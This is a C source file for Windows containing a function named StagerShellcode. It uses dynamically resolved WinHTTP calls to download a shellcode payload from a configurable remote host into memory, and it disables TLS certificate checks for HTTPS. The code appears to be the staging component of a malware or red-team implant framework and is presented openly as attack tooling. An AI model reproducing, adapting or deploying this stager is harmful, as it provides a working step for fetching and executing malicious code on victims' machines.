#include <windows.h>
#include <winhttp.h>

#include <macros.h>
#include <config.h>

BOOL StagerShellcode( 
    _In_     LPCWSTR    Host,
    _In_     INT        Port,
    _In_     LPCWSTR    Path,
    _In_     BOOL       Secure,
    _In_     LPCWSTR    MethodReq,
    _In_opt_ LPCWSTR    UserAgent,
    _In_opt_ LPCWSTR    HeadersAdds,
    _Out_    PBYTE     *pBufferRet,
    _Out_    ULONG_PTR *BufferSzRet
) {
    /*=========================[ Request Winhttp ]=========================*/

    HINTERNET hSession = NULL, 
              hConnect = NULL, 
              hRequest = NULL;

    PBYTE   pBuffer    = NULL;
    ULONG64 BuffSize   = 0;
    DWORD   BytesRead  = 0;
    PBYTE   pTemp      = B_PTR( Instance.Win32.LocalAlloc( LPTR, 1024 ) );

    BOOL bResult = FALSE;  

    hSession = Instance.Win32.WinHttpOpen( UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( !hSession ) goto _Cleanup;

    hConnect = Instance.Win32.WinHttpConnect( hSession, Host, Port, 0 );
    if ( !hConnect ) goto _Cleanup;

    if ( Secure ) {
        
        hRequest = Instance.Win32.WinHttpOpenRequest( hConnect, MethodReq, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE );
        if ( !hRequest ) goto _Cleanup;

        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

        if (!Instance.Win32.WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags))) {
            goto _Cleanup;
        }
    } 

    else {
        hRequest = Instance.Win32.WinHttpOpenRequest( hConnect, MethodReq, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0 );
        if ( !hRequest ) goto _Cleanup;
    }

    if ( !HeadersAdds )
        HeadersAdds = WINHTTP_NO_ADDITIONAL_HEADERS;

    bResult = Instance.Win32.WinHttpSendRequest( hRequest, HeadersAdds, -1, WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );
    if ( !bResult ) goto _Cleanup;

    bResult = Instance.Win32.WinHttpReceiveResponse( hRequest, NULL );
    if ( !bResult ) goto _Cleanup;
    
    if ( !pTemp ) {
        bResult = FALSE;
        goto _Cleanup;
    }

    while( TRUE )
    {
        bResult = Instance.Win32.WinHttpReadData( hRequest, pTemp, 1024, &BytesRead );
        if ( !bResult ) {
            Instance.Win32.LocalFree( pTemp );
            goto _Cleanup;
        }

        BuffSize += BytesRead;

        if ( pBuffer == NULL )
            pBuffer = B_PTR( Instance.Win32.LocalAlloc( LPTR, BytesRead ) );
        else
            pBuffer = B_PTR( Instance.Win32.LocalReAlloc( pBuffer, BuffSize, LMEM_MOVEABLE | LMEM_ZEROINIT ) );

        if ( pBuffer == NULL ) {
            bResult = FALSE; 
            Instance.Win32.LocalFree( pTemp );
            goto _Cleanup;
        }

        MmCopy( C_PTR( ( pBuffer + (BuffSize - BytesRead) ) ), pTemp, BytesRead ) ;
        MmSet( pTemp, '\0', BytesRead );

        if (BytesRead < 1024)
            break;

    } 

    *pBufferRet  = pBuffer;
    *BufferSzRet = BuffSize;

    Instance.Win32.LocalFree( pTemp );

    bResult = TRUE;

_Cleanup:
    if ( hRequest ) Instance.Win32.WinHttpCloseHandle( hRequest );
    if ( hConnect ) Instance.Win32.WinHttpCloseHandle( hConnect );
    if ( hSession ) Instance.Win32.WinHttpCloseHandle( hSession );

    return bResult;
}